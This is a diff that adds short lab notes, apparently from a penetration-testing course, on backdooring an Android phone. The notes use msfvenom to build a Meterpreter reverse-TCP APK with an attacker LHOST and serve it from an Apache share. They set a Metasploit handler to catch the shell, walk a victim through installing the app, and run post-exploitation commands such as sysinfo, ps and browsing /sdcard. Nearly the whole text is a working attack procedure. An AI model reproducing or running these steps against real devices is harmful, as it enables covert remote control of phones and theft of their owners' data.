@@ -1,0 +1,35 @@
+#service postgresql start 
+#msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Desktop/Backdoor.apk
+
+# mkdir /var/www/html/share
+#chmod -R 755 /var/www/html/share
+#chown -R www-data:www-data /var/www/html/share
+#service apache2 start
+#cp /root/Desktop/Backdoor.apk /var/www/html/share/
+
+msf6> use exploit/multi/handler
+msf6> set payload android/meterpreter/reverse_tcp
+mdf6> set LHOST 10.10.1.13
+msf6> exploit -j -z  (exploit running as a background job)
+
+Android
+-------
+http://10.10.1.13/share (in browser)
+When you click install > MainActivity screen appears; click Install. 
+click open
+
+hacker
+-----
+meterpreter shell is successful
+meterpreter> sysinfo
+meterpreter> ipconfig
+meterpreter> pwd
+meterpreter> cd /sdcard
+meterpreter> ps
+
+Android
+-------
+pressing a little bit longer to main-activity > app info > uninstall 
+
+**Meterpreter shell is gone****
+
